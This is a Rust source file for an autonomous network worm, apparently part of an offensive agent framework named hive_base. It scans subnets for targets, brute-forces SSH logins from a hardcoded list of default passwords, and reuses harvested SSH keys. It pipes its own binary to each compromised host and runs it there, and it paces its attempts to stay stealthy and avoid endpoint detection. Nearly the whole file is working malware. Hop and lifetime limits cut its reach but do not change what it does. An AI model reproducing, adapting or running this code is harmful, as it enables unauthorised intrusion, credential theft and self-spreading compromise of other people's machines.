use hive_base::{AgentIdentity, HiveChamber, Message, Payload, Role, Value};
use hive_base::ml::RandomForest;
use rand::Rng;
use std::env;
use std::net::Ipv4Addr;
use std::time::Duration;
use tracing::{info, warn};

// ── Auto-limitation config ───────────────────────────────────────────────────

struct WormLimits {
    max_hops: u32,              // Maximum propagation hops before self-termination
    forbidden_segments: Vec<String>, // Network segments to NEVER touch
    stealth_delay: Duration,    // Base delay between infection attempts
    max_infections_per_minute: u32, // Rate limiter
    self_destruct_after: Duration,  // Auto-terminate after this long
    _avoid_edr_threshold: f32,   // Skip targets with EDR confidence above this
    scan_subnets: Vec<String>,   // Subnets to actively scan
}

impl Default for WormLimits {
    fn default() -> Self {
        let env_subnet = env::var("HIVE_SCAN_SUBNET").unwrap_or_default();
        let mut scan_subnets = vec!["192.168.1.0/24".into()];
        if !env_subnet.is_empty() {
            scan_subnets.push(env_subnet);
        }
        Self {
            max_hops: 10,
            forbidden_segments: vec![
                "10.0.0.0/8".into(),
                "192.168.100.0/24".into(),
            ],
            stealth_delay: Duration::from_secs(30),
            max_infections_per_minute: 2,
            self_destruct_after: Duration::from_secs(3600),
            _avoid_edr_threshold: 0.7,
            scan_subnets,
        }
    }
}

// ── Infection state ──────────────────────────────────────────────────────────

struct InfectionState {
    host: String,
    success: bool,
    _timestamp: u64,
    _method: String,
    _edr_detected: bool,
}

// ── Worm Agent ───────────────────────────────────────────────────────────────

#[allow(dead_code)]
struct WormAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    limits: WormLimits,
    hops: u32,
    infections: Vec<InfectionState>,
    birth_time: std::time::Instant,
    infections_this_minute: u32,
    minute_start: std::time::Instant,
    known_hosts: Vec<String>,
    marl_state: Vec<f32>,  // RL state for hop decisions
}

impl WormAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        let comms = HiveChamber::connect(&identity, Role::Worker)
            .await
            .expect("Worm: failed to connect to colmena arena");

        let limits = WormLimits::default();

        info!("Worm agent active | ID: {} | Max hops: {} | Lifetime: {}m",
            identity.id(), limits.max_hops, limits.self_destruct_after.as_secs() / 60);

        Self {
            comms, identity, limits,
            hops: 0,
            infections: Vec::new(),
            birth_time: std::time::Instant::now(),
            infections_this_minute: 0,
            minute_start: std::time::Instant::now(),
            known_hosts: Vec::new(),
            marl_state: vec![0.0; 62],
        }
    }

    // ── Autonomous propagation (no consensus required) ────────────────────

    async fn discover_targets(&mut self) -> Vec<String> {
        // Read beliefs from scouts (EDR status, network layout)
        let messages = self.comms.read_new().await;
        let mut edr_hosts = Vec::new();
        let mut clean_hosts = Vec::new();

        for msg in messages {
            if let Payload::Belief { asset, value, .. } = &msg.payload {
                match asset.as_str() {
                    "edr_present" => {
                        if let Value::Bool(true) = value {
                            edr_hosts.push(msg.agent_id.to_string());
                            info!("Worm: EDR detected on {}", msg.agent_id);
                        }
                    }
                    "hostname" => {
                        if let Value::String(h) = value {
                            if !self.is_already_infected(h) {
                                let cfg = hive_base::config::HiveConfig::load();
                                if !hive_base::panal::is_safe_target(h, &cfg.brain) {
                                    clean_hosts.push(h.clone());
                                }
                            }
                        }
                    }
                    "network_interfaces" => {
                        // Discover new subnets from network info
                        info!("Worm: network info from scout");
                    }
                    _ => {}
                }
            }
        }

        // Active network discovery (nmap/ARP) across all configured subnets
        for subnet in &self.limits.scan_subnets {
            let discovered = hive_base::discover_hosts(subnet);
            for host in discovered {
                if !self.is_already_infected(&host) && !self.in_forbidden_segment(&host) {
                    clean_hosts.push(host);
                }
            }
        }

        // MARL: prioritize targets using learned policy
        self.marl_prioritize_targets(&mut clean_hosts);

        clean_hosts
    }

    fn marl_prioritize_targets(&self, hosts: &mut [String]) {
        // Build state vector for each target and rank by expected Q-value
        let model_bytes = include_bytes!("../../worker/models/scout_classifier.bin").to_vec();

        if model_bytes.is_empty() { return; }

        if let Some(model) = RandomForest::from_binary(&model_bytes) {
            for host in hosts.iter() {
                let state = self.build_target_state(host);
                if let Some(q_value) = model.predict(&state) {
                    info!("Worm MARL: {} Q-value: {}", host, q_value);
                }
            }
        }
    }

    fn build_target_state(&self, _host: &str) -> Vec<f32> {
        let mut state = vec![0.0f32; 62];
        state[0] = 1.0; // has_agent (we are here)
        state[1] = 0.1; // low EDR (we checked)
        state[2] = 0.0; // not backup
        state[3] = 0.33; // segment
        state[4] = 0.5; // value
        state[5] = 0.0; // not yet compromised
        state[60] = 0.0; // detection low
        state[61] = 0.0; // no alerts
        state
    }

    // ── Infection methods ─────────────────────────────────────────────────

    /// Quick check if port 22 is open on the target
    fn has_ssh(&self, host: &str) -> bool {
        use std::net::{TcpStream, ToSocketAddrs};
        let addr = format!("{}:22", host);
        if let Ok(mut addrs) = addr.to_socket_addrs() {
            if let Some(sa) = addrs.next() {
                return TcpStream::connect_timeout(&sa, std::time::Duration::from_secs(2)).is_ok();
            }
        }
        false
    }

    async fn infect_host(&mut self, host: &str) -> InfectionState {
        // Skip hosts without SSH
        if !self.has_ssh(host) {
            info!("Worm: {} has no SSH, skipping", host);
            return InfectionState {
                host: host.to_string(),
                success: false,
                _timestamp: 0,
                _method: "no_ssh".into(),
                _edr_detected: false,
            };
        }

        let mut rng = rand::thread_rng();
        let method = match rng.gen_range(0..3) {
            0 => "ssh_key",
            1 => "ssh_default_creds",
            _ => "scp_deploy",
        };

        info!("Worm: infecting {} via {}", host, method);

        // Real SSH infection attempt
        let result = match method {
            "ssh_default_creds" => {
                // Try default/weak credentials via sshpass
                let creds = [
                    ("root", "toor"),
                    ("root", "root"),
                    ("root", "admin"),
                    ("root", "password"),
                    ("root", "123456"),
                    ("root", "changeme"),
                    ("admin", "admin"),
                    ("admin", "admin123"),
                    ("admin", "password"),
                    ("user", "user"),
                    ("ubuntu", "ubuntu"),
                ];
                let mut success = false;
                let current_bin = env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
                let binary = std::fs::read(&current_bin).unwrap_or_default();
                for (user, pass) in &creds {
                    // Step 1: verify credentials
                    let verify = std::process::Command::new("sshpass")
                        .args(["-p", pass, "ssh",
                               "-o", "StrictHostKeyChecking=no",
                               "-o", "ConnectTimeout=5",
                               "-o", "UserKnownHostsFile=/dev/null",
                               &format!("{}@{}", user, host),
                               "id"])
                        .output();
                    if let Ok(out) = verify {
                        if out.status.success() {
                            info!("Worm: SSH creds success {}@{} / {}", user, host, pass);
                            // Step 2: deploy binary
                            info!("Worm: deploying to {} via sshpass pipe", host);
                            let deploy = std::process::Command::new("sshpass")
                                .args(["-p", pass, "ssh",
                                       "-o", "StrictHostKeyChecking=no",
                                       "-o", "ConnectTimeout=10",
                                       "-o", "UserKnownHostsFile=/dev/null",
                                       &format!("{}@{}", user, host),
                                       "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &"])
                                .stdin(std::process::Stdio::piped())
                                .spawn();
                            if let Ok(mut child) = deploy {
                                if let Some(mut stdin) = child.stdin.take() {
                                    let _ = std::io::Write::write_all(&mut stdin, &binary);
                                    drop(stdin);
                                }
                                let _ = child.wait();
                                success = true;
                                info!("Worm: binary deployed to {}", host);
                            } else {
                                warn!("Worm: deploy spawn failed for {}", host);
                                success = true; // at least creds work
                            }
                            break;
                        }
                    }
                }
                if !success {
                    warn!("Worm: SSH default creds failed for {}", host);
                }
                success
            }
            "ssh_key" => {
                // Try harvested keys
                let keys = hive_base::harvest_credentials();
                let ssh_keys: Vec<_> = keys.iter()
                    .filter(|(n, _, _)| n.ends_with("_rsa") || n.ends_with("_ed25519"))
                    .collect();

                let mut success = false;
                for (_key_name, key_data, _) in &ssh_keys {
                    if std::fs::write("/tmp/.wk", key_data).is_ok() {
                        let output = std::process::Command::new("ssh")
                            .args(["-o", "StrictHostKeyChecking=no",
                                   "-o", "ConnectTimeout=5",
                                   "-o", "BatchMode=yes",
                                   "-i", "/tmp/.wk",
                                   &format!("root@{}", host),
                                   "id"])
                            .output();
                        let _ = std::fs::remove_file("/tmp/.wk");
                        if let Ok(out) = output {
                            if out.status.success() {
                                success = true;
                                break;
                            }
                        }
                    }
                }
                success
            }
            "scp_deploy" => {
                // Deploy via sshpass pipe with default creds
                let current_bin = env::current_exe().unwrap_or_else(|_| "/proc/self/exe".into());
                let binary = std::fs::read(&current_bin).unwrap_or_default();
                if !binary.is_empty() {
                    let deploy = std::process::Command::new("sshpass")
                        .args(["-p", "toor", "ssh",
                               "-o", "StrictHostKeyChecking=no",
                               "-o", "ConnectTimeout=10",
                               "-o", "UserKnownHostsFile=/dev/null",
                               &format!("root@{}", host),
                                       "cat > /tmp/.w && chmod +x /tmp/.w && /tmp/.w &"])
                        .stdin(std::process::Stdio::piped())
                        .spawn();
                    if let Ok(mut child) = deploy {
                        if let Some(mut stdin) = child.stdin.take() {
                            let _ = std::io::Write::write_all(&mut stdin, &binary);
                            drop(stdin);
                        }
                        let status = child.wait();
                        status.map(|s| s.success()).unwrap_or(false)
                    } else {
                        false
                    }
                } else {
                    false
                }
            }
            _ => false,
        };

        let ts = hive_base::utils::timestamp_now();
        let state = InfectionState {
            host: host.to_string(),
            success: result,
            _timestamp: ts,
            _method: method.to_string(),
            _edr_detected: false,
        };

        if result {
            info!("Worm: SUCCESS - infected {}", host);
            self.hops += 1;
        } else {
            info!("Worm: FAILED - could not infect {}", host);
        }

        state
    }

    // ── Safety checks ────────────────────────────────────────────────────

    fn is_already_infected(&self, host: &str) -> bool {
        self.infections.iter().any(|i| i.host == host && i.success)
    }

    fn in_forbidden_segment(&self, host: &str) -> bool {
        // BRAIN: check safe IPs first
        let cfg = hive_base::config::HiveConfig::load();
        if hive_base::panal::is_safe_target(host, &cfg.brain) {
            return true; // treat safe hosts as forbidden
        }
        for segment in &self.limits.forbidden_segments {
            if host_in_cidr(host, segment) {
                warn!("Worm: {} in forbidden segment {}", host, segment);
                return true;
            }
        }
        false
    }

    fn should_self_destruct(&self) -> bool {
        self.birth_time.elapsed() >= self.limits.self_destruct_after
            || self.hops >= self.limits.max_hops
    }

    fn rate_limit_ok(&mut self) -> bool {
        if self.minute_start.elapsed() >= Duration::from_secs(60) {
            self.infections_this_minute = 0;
            self.minute_start = std::time::Instant::now();
        }
        self.infections_this_minute < self.limits.max_infections_per_minute
    }

    // ── Main worm loop ───────────────────────────────────────────────────

    async fn run(&mut self) {
        info!("Worm: autonomous propagation started (no consensus required)");
        self.comms.send_heartbeat().await;

        loop {
            // Check limits
            if self.should_self_destruct() {
                let reason = if self.hops >= self.limits.max_hops {
                    "max hops reached"
                } else {
                    "lifetime expired"
                };
                info!("Worm: self-destruct ({}) | {} hops, {} infections",
                    reason, self.hops,
                    self.infections.iter().filter(|i| i.success).count());

                // Notify swarm before dying
                let msg = Message::status_event(
                    self.identity.id(), Role::Worker,
                    "worm_terminate", self.identity.id(), Role::Worker,
                    reason,
                );
                self.comms.publish(msg).await;
                break;
            }

            if !self.rate_limit_ok() {
                info!("Worm: rate limit - waiting...");
                tokio::time::sleep(Duration::from_secs(10)).await;
                continue;
            }

            // Discover targets (reads scout beliefs + active scan)
            let targets = self.discover_targets().await;
            if targets.is_empty() {
                info!("Worm: no new targets, waiting...");
                tokio::time::sleep(self.limits.stealth_delay).await;
                continue;
            }

            // Infect opportunistic targets
            for host in &targets[..targets.len().min(3)] {
                if self.should_self_destruct() { break; }
                if !self.rate_limit_ok() { break; }

                let state = self.infect_host(host).await;
                let was_no_ssh = state._method == "no_ssh";
                self.infections.push(state);
                // Only count real infection attempts against rate limit
                if !was_no_ssh {
                    self.infections_this_minute += 1;
                }

                // Random delay between infections (stealth)
                let delay = rand::thread_rng().gen_range(5..=self.limits.stealth_delay.as_secs());
                tokio::time::sleep(Duration::from_secs(delay)).await;
            }

            // Send heartbeat
            self.comms.send_heartbeat().await;
        }

        info!("Worm terminated after {} hops", self.hops);
    }
}

// ── CIDR check helper ────────────────────────────────────────────────────────

fn host_in_cidr(host: &str, cidr: &str) -> bool {
    let parts: Vec<&str> = cidr.split('/').collect();
    if parts.len() != 2 { return false; }
    let prefix_len: u8 = match parts[1].parse() { Ok(n) => n, Err(_) => return false };
    let cidr_ip: Ipv4Addr = match parts[0].parse() { Ok(ip) => ip, Err(_) => return false };
    let host_ip: Ipv4Addr = match host.parse() { Ok(ip) => ip, Err(_) => return false };
    if prefix_len == 0 { return true; }
    let mask = u32::MAX << (32 - prefix_len);
    (u32::from(cidr_ip) & mask) == (u32::from(host_ip) & mask)
}

// ── Main ─────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("swarm");
    info!("Initializing Swarm-Worm (autonomous, no consensus)...");
    let mut worm = WormAgent::new().await;
    worm.run().await;
}
